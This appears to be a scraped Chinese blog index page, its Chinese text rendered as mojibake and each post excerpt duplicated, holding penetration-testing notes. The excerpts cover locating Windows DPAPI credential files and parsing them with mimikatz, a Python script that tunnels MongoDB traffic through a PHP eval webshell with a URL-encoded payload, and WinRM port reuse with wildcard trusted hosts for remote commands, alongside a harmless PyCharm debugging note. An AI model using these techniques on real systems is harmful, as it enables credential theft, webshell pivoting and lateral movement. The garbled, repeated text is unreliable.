<p>æŸ¥æ‰¾æœ¬åœ°çš„Credentials:<br>é€šå¸¸çš„ä¿å­˜ä½ç½®:</p>
<ul>
<li><code>%appdata%\Microsoft\Credentials</code></li>
<li><code>%localappdata%\Microsoft\Credentials</code></li>
<li><code>%userprofile%\AppData\Local\Microsoft\Credentials\*</code></li>
</ul>
<p>å› ä¸ºæ–‡ä»¶è¢«éšè—ï¼Œå‘½ä»¤è¡Œä¸‹éœ€è¦æŸ¥çœ‹éœ€è¦åŠ ä¸Š<code>/a</code>å¯ä»¥çœ‹åˆ°:</p>
<pre class="line-numbers language-none"><code class="language-none">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="è·å–GUID"><a href="#è·å–GUID" class="headerlink" title="è·å–GUID"></a>è·å–GUID</h3><pre class="line-numbers language-none"><code class="language-none"># æ‰“å°ç»“æ„ä½“ä¿¡æ¯
mimikatz dpapi::cred &#x2F;in:&quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : &#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : &#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000012 - 18
  szDescription      : æœ¬åœ°å‡­æ®æ•°æ®

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51
  dwDataLen          : 00002a70 - 10864
  pbData             : xxxxxxz
  dwSignLen          : 00000040 - 64
  pbSign             : xxxxx
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2020/04/13/dpapi-pass-dump.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="èƒŒæ™¯ä»‹ç»"><a href="#èƒŒæ™¯ä»‹ç»" class="headerlink" title="èƒŒæ™¯ä»‹ç»"></a>èƒŒæ™¯ä»‹ç»</h3><p>DPAPI(Date Protection Application Programming Interface)ï¼Œä»windows2000ä¹‹åï¼Œå¾®è½¯æä¾›çš„ä¸€ä¸ªç‰¹æ®Šæ•°æ®ä¿æŠ¤æ¥å£ï¼Œä½¿ç”¨äº†å¯¹ç§°çš„åŠ è§£å¯†å‡½æ•°å¯¹å¯†ç åŠ å¯†ã€‚åŒ…æ‹¬:</p>
<ul>
<li>IEã€Chromeå¯†ç ç™»é™†è¡¨å•çš„è‡ªåŠ¨å®Œæˆ</li>
<li>é‚®ç®±å®¢æˆ·ç«¯ç”¨æˆ·å¯†ç </li>
<li>FTPç®¡ç†è´¦æˆ·å¯†ç </li>
<li>è¿œç¨‹æ¡Œé¢èº«ä»½å¯†ç </li>
<li>â€¦â€¦</li>
</ul>
<p>æŸ¥æ‰¾æœ¬åœ°çš„Credentials:<br>é€šå¸¸çš„ä¿å­˜ä½ç½®:</p>
<ul>
<li><code>%appdata%\Microsoft\Credentials</code></li>
<li><code>%localappdata%\Microsoft\Credentials</code></li>
<li><code>%userprofile%\AppData\Local\Microsoft\Credentials\*</code></li>
</ul>
<p>å› ä¸ºæ–‡ä»¶è¢«éšè—ï¼Œå‘½ä»¤è¡Œä¸‹éœ€è¦æŸ¥çœ‹éœ€è¦åŠ ä¸Š<code>/a</code>å¯ä»¥çœ‹åˆ°:</p>
<pre class="line-numbers language-none"><code class="language-none">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="è·å–GUID"><a href="#è·å–GUID" class="headerlink" title="è·å–GUID"></a>è·å–GUID</h3><pre class="line-numbers language-none"><code class="language-none"># æ‰“å°ç»“æ„ä½“ä¿¡æ¯
mimikatz dpapi::cred &#x2F;in:&quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : &#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : &#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000012 - 18
  szDescription      : æœ¬åœ°å‡­æ®æ•°æ®

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         : 
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51
  dwDataLen          : 00002a70 - 10864
  pbData             : xxxxxxz
  dwSignLen          : 00000040 - 64
  pbSign             : xxxxx
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2020/04/13/dpapi-pass-dump.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/12/13/python-debug.html" >Pycharmè¿œç¨‹è°ƒè¯•Docker</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-12-13  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>è°ƒè¯•çš„æµæ°´è´¦:</p>
<p>åŸç†å°±æ˜¯pycharmä½œä¸ºserverï¼Œè¿œç¨‹è¦debugçš„æ˜¯clientã€‚åœ¨clientè¦å®‰è£…pycharm-debug.eggï¼Œå®‰è£…ä¹‹å</p>
<pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ²¡æ¯›ç—…å°±è¡¨ç¤ºå®‰è£…æˆåŠŸã€‚</p>
<p>è¿™ä¸ªpycharmçš„åŒ…ä¸€èˆ¬åœ¨è¿™ä¸ªç›®å½•:</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶åé…ç½®pycharm:</p>
<pre class="line-numbers language-none"><code class="language-none">åœ¨Preferences -&gt; project ä¼šæœ‰å½“å‰é¡¹ç›®ï¼Œå¯ä»¥å…ˆè®¾ç½® project Interpreterï¼Œä½†æ˜¯å¦‚æœå•å•ä¸ºäº†è°ƒè¯•ï¼Œè¿™ä¸ªä¸ç”¨è®¾ç½®å°±å¯ä»¥ã€‚ä¸ºäº†æµ‹è¯•æ–¹ä¾¿å¯ä»¥æ·»åŠ ä¸€ä¸ªsftpåŒæ­¥:

Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deployment

æ·»åŠ å’ŒDockerç›¸å…³çš„ç«¯å£å’ŒIPï¼Œä¸¾ä¾‹æ¥è¯´æŠŠDockerçš„22ç«¯å£æ˜ å°„åˆ°æœ¬æœºçš„20022ã€‚è®¾ç½®å®Œäº†ä¹‹åï¼Œå¯ä»¥åœ¨è¿™é‡ŒåŒæ­¥ä»£ç :

Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç»è¿‡ä¸Šé¢çš„æ­¥éª¤ç°åœ¨æœ‰äº†ä¸€ä¸ªsftpæ¥åŒæ­¥æœ¬åœ°çš„ä»£ç å’Œè¿œç¨‹çš„ä»£ç ï¼Œç„¶åè®¾ç½®ä½¿ç”¨pydevdæ¥è¿œç¨‹è°ƒè¯•ã€‚</p>
	

	</div>
  <a type="button" href="/2019/12/13/python-debug.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>è°ƒè¯•çš„æµæ°´è´¦:</p>
<p>åŸç†å°±æ˜¯pycharmä½œä¸ºserverï¼Œè¿œç¨‹è¦debugçš„æ˜¯clientã€‚åœ¨clientè¦å®‰è£…pycharm-debug.eggï¼Œå®‰è£…ä¹‹å</p>
<pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ²¡æ¯›ç—…å°±è¡¨ç¤ºå®‰è£…æˆåŠŸã€‚</p>
<p>è¿™ä¸ªpycharmçš„åŒ…ä¸€èˆ¬åœ¨è¿™ä¸ªç›®å½•:</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶åé…ç½®pycharm:</p>
<pre class="line-numbers language-none"><code class="language-none">åœ¨Preferences -&gt; project ä¼šæœ‰å½“å‰é¡¹ç›®ï¼Œå¯ä»¥å…ˆè®¾ç½® project Interpreterï¼Œä½†æ˜¯å¦‚æœå•å•ä¸ºäº†è°ƒè¯•ï¼Œè¿™ä¸ªä¸ç”¨è®¾ç½®å°±å¯ä»¥ã€‚ä¸ºäº†æµ‹è¯•æ–¹ä¾¿å¯ä»¥æ·»åŠ ä¸€ä¸ªsftpåŒæ­¥:

Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deployment

æ·»åŠ å’ŒDockerç›¸å…³çš„ç«¯å£å’ŒIPï¼Œä¸¾ä¾‹æ¥è¯´æŠŠDockerçš„22ç«¯å£æ˜ å°„åˆ°æœ¬æœºçš„20022ã€‚è®¾ç½®å®Œäº†ä¹‹åï¼Œå¯ä»¥åœ¨è¿™é‡ŒåŒæ­¥ä»£ç :

Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ç»è¿‡ä¸Šé¢çš„æ­¥éª¤ç°åœ¨æœ‰äº†ä¸€ä¸ªsftpæ¥åŒæ­¥æœ¬åœ°çš„ä»£ç å’Œè¿œç¨‹çš„ä»£ç ï¼Œç„¶åè®¾ç½®ä½¿ç”¨pydevdæ¥è¿œç¨‹è°ƒè¯•ã€‚</p>
	
	</div>
  <a type="button" href="/2019/12/13/python-debug.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/10/23/php-eval-proxy.html" >PHP Eval HTTP Proxy</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-10-23  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>èƒŒæ™¯: linuxï¼Œphpç¯å¢ƒä¸‹çš„reGeorgä¸å¯ç”¨ã€‚<br>ç›®æ ‡: åˆ†æreGeorgçš„åŸç†å°è¯•æ”¹ä¸€ä¸‹<br>ç»“æœ: é€ äº†ä¸€ä¸ªåŠæˆå“ï¼Œå› ä¸ºä¸èƒ½ä¿æŒsocksè¿é€šï¼Œå¯ä»¥ç”¨æ¥è®¿é—®ç®€å•çš„åè®®æµæ•°æ®ã€‚æ¯”å¦‚httpï¼Œmongoï¼Œredis</p>
<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
  HTTP based protocol:
    Elastic, CouchDB, Mongodb, Docker

  Text-based protocol:
    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="å°è¯•1"><a href="#å°è¯•1" class="headerlink" title="å°è¯•1"></a>å°è¯•1</h3><p>è¿™ä¸ªè„šæœ¬æ˜¯ä¸ªæ®‹çš„:</p>
<pre class="line-numbers language-none"><code class="language-none">#coding: utf-8
import socket
import binascii
import requests


headers &#x3D; &#123;
&quot;Host&quot;: &quot;&quot;,
&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&#x2F;20050405 Firefox&#x2F;1.0 (Ubuntu package 1.0.2)&quot;,
&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,
&quot;Connection&quot;: &quot;close&quot;
&#125;

url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;eval.php&quot;
s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((&quot;127.0.0.1&quot;,8889))
s.listen(5)
sock, addr_info &#x3D; s.accept()

while True:
    print &#39;Connect by &#39;, addr_info
    data &#x3D; sock.recv(102400)
    payload &#x3D; &#39;pass&#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&#39; + hex2bin(data) + &quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&#39;timed_out&#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&#39;false%20lala&#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&quot;
    print payload
    data2 &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,timeout&#x3D;30).content
    print data2
    print &quot;sending data&quot;
    sock.send(data2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p>
<p>ç»‘å®šæœ¬æœºçš„8889ç«¯å£ï¼Œç„¶åmongoç›´æ¥è¿,<code>mongo --port 8889</code>,å¦‚æœæƒ³è§‚å¯Ÿä¹‹é—´çš„æµé‡å¯ä»¥è¿™æ ·åš:</p>
 <pre class="line-numbers language-none"><code class="language-none">python mongo_proxy  &#x2F;&#x2F;ç›‘å¬8889
socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &#x2F;&#x2F;æµé‡è‚‰çœ¼å¯ä»¥çœ‹
mongo --port 8888  &#x2F;&#x2F;è¿æ¥8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>å‘æ•£ä¸€ä¸‹ï¼Œè¿™ä¸ªæ•´ä½“å°±æ˜¯ä¸€ä¸ªè¯·æ±‚ä»£ç†ï¼ŒåŒ…è£¹ä¸€ä¸‹å‘é€åˆ°äº†è¿œç¨‹çš„webshellï¼Œç„¶åwebshellä¹‹è¡Œè„šæœ¬ã€‚Regeorgæ˜¯æ›´é€šç”¨çš„æ–¹å¼ï¼Œä½ å¯ä»¥æŠŠè¿™ä¸ªè„šæœ¬çœ‹ä½œregeorgä½œç”¨çš„<code>å­é›†</code>ï¼Œå› ä¸ºå¦‚æœè¦è®¿é—®ç«¯å£ä¹‹ç±»çš„å°±éœ€è¦æ”¹è„šæœ¬äº†ã€‚</p>
<p>çœ‹äº†çœ‹Regeorgçš„å®ç°ï¼Œå°±æ˜¯æ¥å—socks5æˆ–è€…socks4çš„ä»£ç†ä¹‹åï¼Œå‘é€æ•°æ®åŒ…åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œè¿‡ç¨‹å¤§æ¦‚æ˜¯è¿™æ ·å­çš„:</p>
	

	</div>
  <a type="button" href="/2019/10/23/php-eval-proxy.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>èƒŒæ™¯: linuxï¼Œphpç¯å¢ƒä¸‹çš„reGeorgä¸å¯ç”¨ã€‚<br>ç›®æ ‡: åˆ†æreGeorgçš„åŸç†å°è¯•æ”¹ä¸€ä¸‹<br>ç»“æœ: é€ äº†ä¸€ä¸ªåŠæˆå“ï¼Œå› ä¸ºä¸èƒ½ä¿æŒsocksè¿é€šï¼Œå¯ä»¥ç”¨æ¥è®¿é—®ç®€å•çš„åè®®æµæ•°æ®ã€‚æ¯”å¦‚httpï¼Œmongoï¼Œredis</p>
<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
  HTTP based protocol:
    Elastic, CouchDB, Mongodb, Docker

  Text-based protocol:
    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="å°è¯•1"><a href="#å°è¯•1" class="headerlink" title="å°è¯•1"></a>å°è¯•1</h3><p>è¿™ä¸ªè„šæœ¬æ˜¯ä¸ªæ®‹çš„:</p>
<pre class="line-numbers language-none"><code class="language-none">#coding: utf-8
import socket
import binascii
import requests


headers &#x3D; &#123;
&quot;Host&quot;: &quot;&quot;,
&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&#x2F;20050405 Firefox&#x2F;1.0 (Ubuntu package 1.0.2)&quot;,
&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,
&quot;Connection&quot;: &quot;close&quot;
&#125;

url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;eval.php&quot;
s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((&quot;127.0.0.1&quot;,8889))
s.listen(5)
sock, addr_info &#x3D; s.accept()

while True:
    print &#39;Connect by &#39;, addr_info
    data &#x3D; sock.recv(102400)
    payload &#x3D; &#39;pass&#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&#39; + hex2bin(data) + &quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&#39;timed_out&#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&#39;false%20lala&#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&quot;
    print payload
    data2 &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,timeout&#x3D;30).content
    print data2
    print &quot;sending data&quot;
    sock.send(data2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p>
<p>ç»‘å®šæœ¬æœºçš„8889ç«¯å£ï¼Œç„¶åmongoç›´æ¥è¿,<code>mongo --port 8889</code>,å¦‚æœæƒ³è§‚å¯Ÿä¹‹é—´çš„æµé‡å¯ä»¥è¿™æ ·åš:</p>
 <pre class="line-numbers language-none"><code class="language-none">python mongo_proxy  &#x2F;&#x2F;ç›‘å¬8889
socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &#x2F;&#x2F;æµé‡è‚‰çœ¼å¯ä»¥çœ‹
mongo --port 8888  &#x2F;&#x2F;è¿æ¥8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>å‘æ•£ä¸€ä¸‹ï¼Œè¿™ä¸ªæ•´ä½“å°±æ˜¯ä¸€ä¸ªè¯·æ±‚ä»£ç†ï¼ŒåŒ…è£¹ä¸€ä¸‹å‘é€åˆ°äº†è¿œç¨‹çš„webshellï¼Œç„¶åwebshellä¹‹è¡Œè„šæœ¬ã€‚Regeorgæ˜¯æ›´é€šç”¨çš„æ–¹å¼ï¼Œä½ å¯ä»¥æŠŠè¿™ä¸ªè„šæœ¬çœ‹ä½œregeorgä½œç”¨çš„<code>å­é›†</code>ï¼Œå› ä¸ºå¦‚æœè¦è®¿é—®ç«¯å£ä¹‹ç±»çš„å°±éœ€è¦æ”¹è„šæœ¬äº†ã€‚</p>
<p>çœ‹äº†çœ‹Regeorgçš„å®ç°ï¼Œå°±æ˜¯æ¥å—socks5æˆ–è€…socks4çš„ä»£ç†ä¹‹åï¼Œå‘é€æ•°æ®åŒ…åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼Œè¿‡ç¨‹å¤§æ¦‚æ˜¯è¿™æ ·å­çš„:</p>
	
	</div>
  <a type="button" href="/2019/10/23/php-eval-proxy.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2019/10/23/winrm.html" >winRMç«¯å£å¤ç”¨</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2019-10-23  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åŸºæœ¬åŸç†æ˜¯åˆ©ç”¨windowsçš„è¿œç¨‹ç®¡ç†æœåŠ¡WinRM,åœ¨Windows 2003 ServeråŠ å…¥äº†å†…æ ¸çº§é©±åŠ¨ç¨‹åº(http.sys),ç”¨äºç›‘å¬httpæµé‡å¹¶æ ¹æ®URLè¿›è¡Œå¤„ç†ï¼Œå…è®¸ä»»æ„ç”¨æˆ·è¿›ç¨‹å…±äº«ç”¨äºHTTPæµé‡çš„TCPç«¯å£ã€‚é€šè¿‡http.sys,å¤šä¸ªè¿›ç¨‹å¯ä»¥åŒæ—¶ç›‘å¬åŒä¸€ç«¯å£çš„HTTPæµé‡</p>
<p>ç³»ç»Ÿé»˜è®¤æœ‰10ä¸ªDAClï¼Œå¯ä»¥é€šè¿‡<code>netsh http show urlacl</code>çœ‹åˆ°å…·ä½“å†…å®¹ï¼Œå…¶ä¸­5985æ˜¯httpç«¯å£ï¼Œ5986æ˜¯httpsï¼Œåœ¨æˆ‘çš„Windows Server 2012ä¸Šé¢é»˜è®¤æ²¡æœ‰å¼€å¯ï¼Œåªå¼€å¯äº†ä¸€ä¸ª5985ç«¯å£ã€‚</p>
<h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>Windows 2008é»˜è®¤ä¸å¼€å¯è¯¥æœåŠ¡ï¼Œwindows 2012ä»¥åŠä»¥ä¸Šé»˜è®¤å¼€å¯è¯¥æœåŠ¡ã€‚</p>
<h3 id="å¼€å¯æœåŠ¡"><a href="#å¼€å¯æœåŠ¡" class="headerlink" title="å¼€å¯æœåŠ¡"></a>å¼€å¯æœåŠ¡</h3><p>æœ¬åœ°æœºå™¨éœ€è¦è¿æ¥è¿œç¨‹WinRMæœåŠ¡çš„æ—¶å€™ï¼Œæœ¬åœ°ä¹Ÿéœ€è¦å¼€å¯WinRMæœåŠ¡ï¼Œç„¶åè®¾ç½®ä¿¡ä»»è¿æ¥çš„ä¸»æœºï¼Œæ‰§è¡Œå‘½ä»¤:</p>
<pre class="line-numbers language-none"><code class="language-none">winrm quickconfig -q
winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>è¿æ¥(é»˜è®¤ç«¯å£æ˜¯5985ï¼Œéœ€è¦åŠ ä¸Šå»):</p>
<pre class="line-numbers language-none"><code class="language-none">winrs -r:http:&#x2F;&#x2F;&lt;ip&gt;:&lt;port&gt; -u:&lt;user&gt; -p:&lt;pass&gt; &lt;command&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2019/10/23/winrm.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åŸºæœ¬åŸç†æ˜¯åˆ©ç”¨windowsçš„è¿œç¨‹ç®¡ç†æœåŠ¡WinRM,åœ¨Windows 2003 ServeråŠ å…¥äº†å†…æ ¸çº§é©±åŠ¨ç¨‹åº(http.sys),ç”¨äºç›‘å¬httpæµé‡å¹¶æ ¹æ®URLè¿›è¡Œå¤„ç†ï¼Œå…è®¸ä»»æ„ç”¨æˆ·è¿›ç¨‹å…±äº«ç”¨äºHTTPæµé‡çš„TCPç«¯å£ã€‚é€šè¿‡http.sys,å¤šä¸ªè¿›ç¨‹å¯ä»¥åŒæ—¶ç›‘å¬åŒä¸€ç«¯å£çš„HTTPæµé‡</p>
<p>ç³»ç»Ÿé»˜è®¤æœ‰10ä¸ªDAClï¼Œå¯ä»¥é€šè¿‡<code>netsh http show urlacl</code>çœ‹åˆ°å…·ä½“å†…å®¹ï¼Œå…¶ä¸­5985æ˜¯httpç«¯å£ï¼Œ5986æ˜¯httpsï¼Œåœ¨æˆ‘çš„Windows Server 2012ä¸Šé¢é»˜è®¤æ²¡æœ‰å¼€å¯ï¼Œåªå¼€å¯äº†ä¸€ä¸ª5985ç«¯å£ã€‚</p>
<h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>Windows 2008é»˜è®¤ä¸å¼€å¯è¯¥æœåŠ¡ï¼Œwindows 2012ä»¥åŠä»¥ä¸Šé»˜è®¤å¼€å¯è¯¥æœåŠ¡ã€‚</p>
<h3 id="å¼€å¯æœåŠ¡"><a href="#å¼€å¯æœåŠ¡" class="headerlink" title="å¼€å¯æœåŠ¡"></a>å¼€å¯æœåŠ¡</h3><p>æœ¬åœ°æœºå™¨éœ€è¦è¿æ¥è¿œç¨‹WinRMæœåŠ¡çš„æ—¶å€™ï¼Œæœ¬åœ°ä¹Ÿéœ€è¦å¼€å¯WinRMæœåŠ¡ï¼Œç„¶åè®¾ç½®ä¿¡ä»»è¿æ¥çš„ä¸»æœºï¼Œæ‰§è¡Œå‘½ä»¤:</p>
<pre class="line-numbers language-none"><code class="language-none">winrm quickconfig -q
winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>è¿æ¥(é»˜è®¤ç«¯å£æ˜¯5985ï¼Œéœ€è¦åŠ ä¸Šå»):</p>
<pre class="line-numbers language-none"><code class="language-none">winrs -r:http:&#x2F;&#x2F;&lt;ip&gt;:&lt;port&gt; -u:&lt;user&gt; -p:&lt;pass&gt; &lt;command&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2019/10/23/winrm.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
